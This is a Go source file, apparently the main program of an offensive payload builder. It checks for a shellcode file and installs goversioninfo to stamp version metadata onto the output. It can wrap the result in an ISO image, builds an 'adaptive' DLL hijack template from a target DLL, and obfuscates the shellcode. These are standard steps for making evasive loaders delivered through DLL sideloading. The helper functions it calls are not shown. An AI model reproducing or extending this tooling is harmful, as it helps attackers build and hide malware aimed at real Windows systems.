package main

import (
	"errors"
	"log"
	"os"
	"os/exec"
)

func checkError(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

func main() {
	var (
		cmd []string
		err error
	)

	// Check if Go is installed
	if _, err = exec.LookPath("go"); err != nil {
		log.Fatal("[!] Go is not installed or not in PATH, please install " +
			"and/or add it to your PATH")
	}

	// Check if shellcode file exists
	if _, err = os.Stat(flags.shellcodeFile); os.IsNotExist(err) {
		log.Fatal("[!] Shellcode file does not exist")
	}

	// Check if goversioninfo is installed
	if _, err = exec.LookPath("goversioninfo"); err != nil {
		log.Println("[-] goversoinfo is not installed, installing it now...")
		cmd = []string{
			"go",
			"install",
			"github.com/josephspurrier/goversioninfo/cmd/goversioninfo@latest",
		}
		if _, err = runShellCommand(cmd); err != nil {
			log.Fatal("[!] Failed to install goversioninfo: " + err.Error())
		}
		log.Println("[+] goversioninfo installed successfully")
	}

	// Check if ISO generation is desired, and if so,
	// check if mkisofs is installed
	if !(flags.outputIsoFile == "") {
		if _, err = exec.LookPath("mkisofs"); err != nil {
			log.Fatal("[!] mkisofs is not installed or not in PATH, please " +
				"install and/or add it to your PATH")
		}
	}

	if !(flags.adaptHijackDll == "") {
		if _, err = os.Stat(flags.adaptHijackDll); os.IsNotExist(err) {
			log.Fatalf(
				"[!] Hijack DLL file %s does not exist",
				flags.adaptHijackDll,
			)
		}
		generateAdaptiveDLLTemplate()
	} else {
		//generateStandardDLLTemplate()
	}

	err = scObfuscator(flags.shellcodeFile)
	checkError(err)

}

func runShellCommand(command []string) (string, error) {
	var (
		cmd    *exec.Cmd
		err    error
		output []byte
	)

	if len(command) == 0 {
		return "", errors.New("no command provided")
	}

	cmd = exec.Command(command[0], command[1:]...)
	output, err = cmd.CombinedOutput()
	return string(output), err
}
